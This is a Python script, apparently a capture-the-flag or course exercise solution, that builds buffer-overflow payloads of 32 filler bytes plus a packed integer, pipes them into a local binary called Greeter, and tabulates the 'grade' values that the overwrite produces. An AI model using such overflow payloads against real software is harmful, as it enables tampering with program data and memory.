import struct
import subprocess
import re
from tabulate import tabulate

save_only_diff = True

def proc(n):
    grade_map = []

    with open("results.txt", "w") as results_file:
        for num in range(n):
            # Exploit payload to change Grade to 8
            payload = b"A" * 32  # Filler to reach Grade
            num_str = struct.pack("<I", num)
            print(num_str)
            payload += num_str

            # Save to a file
            with open("./grade_change.txt", "wb") as f:
                f.write(payload)

            # Run Greeter with new file
            result = subprocess.run(["./Greeter < grade_change.txt"], capture_output=True, shell=True)
            output = result.stdout

            # Decode the raw byte output (if it can be decoded)
            try:
                decoded_output = output.decode('utf-8')
            except UnicodeDecodeError:
                decoded_output = f"Binary output: {output.hex()}"

            # Extract the grade using regex
            grade = re.search(r"your grade is (\d+)", decoded_output)
            if grade:
                if not save_only_diff:
                    grade = int(grade.group(1))
                    grade_map.append((num, num_str, grade))
                else:
                    if int(grade.group(1)) != num:
                        grade = int(grade.group(1))
                        grade_map.append((num, num_str, grade))

            # Append to results
            results_file.write(f"Grade={num} (0x{num:08x}):\n")
            results_file.write(decoded_output + "\n")
            results_file.write("-" * 50)
            results_file.write("\n")

    print_grade_map(grade_map)
    return

def print_grade_map(grade_map):
    headers = ["Num", "Num (Hex)", "Grade"]
    table = [(num, f"0x{num:08x}", grade) for num, _, grade in grade_map]
    print(tabulate(table, headers=headers, tablefmt="grid"))

if __name__ == "__main__":
    n = int(input("max num: "))
    proc(n)